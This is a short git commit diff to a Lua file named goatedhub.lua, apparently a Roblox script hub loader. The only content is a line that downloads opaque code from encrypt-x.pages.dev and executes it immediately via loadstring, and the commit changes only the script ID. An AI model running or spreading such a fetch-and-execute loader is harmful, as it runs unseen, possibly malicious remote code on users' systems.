893525de7d981444a6d47caa5d8e0208e345aa1a
Armeuim Skript <vioo10952@gmail.com>
2026-04-26 12:37:04 +0200

    Update goatedhub.lua

--- goatedhub.lua
+++ goatedhub.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=1023306221052"))("1023306221052")
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5925148823343"))("5925148823343")
